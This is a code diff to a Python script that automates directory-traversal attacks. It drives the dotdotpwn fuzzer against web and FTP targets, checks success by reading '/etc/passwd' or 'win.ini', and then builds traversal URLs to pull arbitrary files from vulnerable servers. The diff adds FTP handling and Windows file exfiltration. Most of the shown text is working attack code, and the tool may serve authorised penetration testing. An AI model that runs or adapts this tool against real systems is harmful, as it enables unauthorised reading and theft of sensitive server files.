@@ -43,14 +43,20 @@ def dotPwn(URL):
 #	-b	Break after the first vulnerability is found
 #	-q	Quiet mode (doesn't print each attempt)
 #	-C	Continue if no data was received from host
-    port, resultsOut, baseURL, URL = parseURL(URL)
-    konfirmString = setDotPwnOptions()
+
+# why am I not using the -p option for filename with payloads?
+    port, resultsOut, baseURL, URL, module = parseURL(URL)
+    konfirmString,konfirmFile = setDotPwnOptions()
     if ("TRAVERSAL" in URL):
-        DOTPWN = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (URL, konfirmString, args.depth, args.os, port)
-        DOTPWNE = 'dotdotpwn.pl -m http-url -u %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (URL, konfirmString, args.depth, args.os, port, args.extensions)
+        #last update added 'module' (previously http-url) and -h for host. May need to revert
+        #if the -h option breaks http-url
+        DOTPWN = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
+        print "DOTPWN: %s" % DOTPWN
+        DOTPWNE = 'dotdotpwn.pl -m %s -u %s -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (module, URL, baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
     else:
-        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port)
-        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, args.depth, args.os, port, args.extensions)
+        print "WARN: NO 'TRAVERSAL' TARGETING STRING FOUND IN URL"
+        DOTPWN = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port)
+        DOTPWNE = 'dotdotpwn.pl -m http -h %s -k %s -f %s -d %s -o %s -x %s -t 1 -e %s -q -C -b' % (baseURL, konfirmString, konfirmFile, args.depth, args.os, port, args.extensions)
     try:
         DOTPWNRESULTS = subprocess.check_output(DOTPWN, shell=True)
     except CalledProcessError as ex:
@@ -118,7 +124,10 @@ def retrieve():
             vulnBasetmp = vulnBase.replace("/", "_") #for outputFile
             xfil = xfil.replace("/", encodedSplit)
             #2x vulnStringPrefix due to a parsing bug. Additional shouldn't hurt....
-            fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
+            if vulnPage == "":
+                fullURL = vulnProto + vulnBase + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
+            else:
+                fullURL = vulnProto + vulnBase + vulnPage + vulnStringPrefix + vulnStringPrefix + xfil + vulnStringSuffix
             #print "DEBUG: %s" % fullURL
             fileContents, status_code = grabFileFromURL(fullURL)
             if (status_code == 200):
@@ -240,14 +249,21 @@ def parseURL(url):
         URL = url[:-1]
     else:
         URL = url
-    return port, resultsOut, baseURL, URL
+    if ("http" in URL):
+        module = "http-url"
+    elif ("ftp" in URL):
+        module = "ftp"
+    #print "Port, resOut, baseURL, URL: %s %s %s %s %s" % (port, resultsOut, baseURL, URL, module)
+    return port, resultsOut, baseURL, URL, module
 
 def setDotPwnOptions():
     if (args.os == "unix"):
         konfirmString = '"root:"'
+        konfirmFile = '/etc/passwd'
     if (args.os == "windows"):
         konfirmString = '"[fonts]"'
-    return konfirmString
+        konfirmFile = '/windows/win.ini'
+    return konfirmString,konfirmFile
 
 
 #will return values to build a string like base+page+pre+path+encodedsplit+userrequestfile+suffix
@@ -271,6 +287,9 @@ def analyzeVuln(vulnar):
         if ("https://" in tmp):
             vulnProto = "https://"
             vulnBase = tmp.split("https://")[1]
+        if ("ftp://" in tmp):
+            vulnProto = "ftp://"
+            vulnBase = tmp.split("ftp://")[1]
         vulnPagetmp = vulnBase.split("/",1)[1]
         vulnBase = vulnBase.split("/",1)[0]
         vulnBase = vulnBase + "/"
@@ -281,8 +300,12 @@ def analyzeVuln(vulnar):
             vulnPage = vulnPage + "="
             vulnStringPrefixtmp = vulnPagetmp.split("=",1)[1]
         else:                 #vulnPage with no param, ie index.php/
-            vulnPage = vulnPagetmp.split("/",2)[0]
-            vulnPage = vulnPage + "/"
+            if ("passwd" in vulnPagetmp or "win.ini" in vulnPagetmp):
+                #the vulnPage may be equal to the vulnBase/webRoot, no specific page
+                vulnPage = ""
+            else:
+                vulnPage = vulnPagetmp.split("/",2)[0]
+                vulnPage = vulnPage + "/"
             #print "DEBUG: vulnPagetmpsplit %s" % vulnPagetmp.split("/",2)
             vulnStringPrefixtmp = vulnPagetmp.split("/",2)[len(vulnPagetmp.split("/",2))-1]
             #print "DEBUG: vulnStringPrefixtmp: %s" %vulnStringPrefixtmp
@@ -304,8 +327,16 @@ def analyzeVuln(vulnar):
                     else:
                         encodedSplit = encodedSplit + c
         if (args.os == 'windows'):
-            print "Error: Windows not supported for file exfil yet"
-            raise
+            print "VulnStringPrefixtmp: " + vulnStringPrefixtmp
+            vulnStringPrefix = vulnStringPrefixtmp.split("windows")[0]
+            encodedSplittmp = vulnStringPrefixtmp.split("windows")[1]
+            if ("win.ini" in vulnStringPrefixtmp):
+                vulnStringSuffix = vulnStringPrefixtmp.split("win.ini")[1]
+                for c in encodedSplittmp:
+                    if (c == "w"):
+                        break
+                    else:
+                        encodedSplit = encodedSplit + c
         vals = vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit
         print "DEBUG: Make sure these values are correct: vulnProto, vulnBase, vulnPage, vulnStringPrefix, vulnStringSuffix, encodedSplit"
         print vals
